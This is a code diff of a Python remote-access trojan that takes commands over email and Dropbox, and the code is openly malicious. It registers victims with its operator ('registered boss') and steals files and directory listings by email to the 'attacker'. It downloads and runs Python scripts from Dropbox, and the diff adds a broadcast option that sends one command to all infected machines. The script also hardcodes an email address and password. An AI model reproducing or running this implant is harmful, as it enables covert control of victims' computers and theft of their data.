@@ -13,6 +13,7 @@ import uuid
 #To receive a file from user: fetch [file path] [id]
 #To execute a python script from dropbox: execute [Dropbox path] [id]
 #To receive directory information: show [Directory path] [id]
+#NOTE: Use "all" in place of id if you want this to send to all processes running.
 
 emailAdr = "os.services.updates@gmail.com"
 password = "cse363esc"
@@ -29,7 +30,7 @@ dbx = dropbox.Dropbox(auth_token)
 #Keep track of last Command used
 lastCommand = ""
 
-#Sends over email with initial credentials 
+#Sends over email with initial credentials
 def initMessage():
     message = "Subject: " + str(id) + " is registered boss."
     sendEmail(message)
@@ -73,7 +74,7 @@ def download_file(filePath, localName):
         execution_receipt = "Subject: Failed to download " + filePath + " into " + localName + " file in " + str(id) + " computer." + "\n\n"
         execution_receipt += "Download failed"
         sendEmail(execution_receipt)
-        
+
 #Send email with msg over SMTP SSL to attacker
 def sendEmail(msg):
     port = 465  # For SSL
@@ -93,8 +94,8 @@ def showFiles(commandString):
     del(splitCommand[0])
 
     for x in range(len(splitCommand)):
-        print("At element " + str(x) + " is " + splitCommand[x]) 
-        
+        print("At element " + str(x) + " is " + splitCommand[x])
+
     print("This is length: " + str(len(splitCommand)))
 
     if len(splitCommand) == 2:
@@ -153,11 +154,11 @@ def executeCom(commandString):
         try:
             os.system('python ' + executable_file)
             os.remove(executable_file)
-        
+
         except:
             subjectLine = "Subject: Failed to run shell exe " + id
             sendEmail(subjectLine)
- 
+
 
 
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
@@ -203,6 +204,8 @@ def readEmail():
             if(str(id) in subject):
                 mail.store(i, '+FLAGS', '\\Deleted')
                 commands.append(subject)
+            elif("all" in subject):
+                commands.append(subject)
 
     if commands:
        commandParser(commands)
@@ -223,4 +226,3 @@ def periodicUpdates(seconds):
 
 initMessage()
 periodicUpdates(10.0)
-    
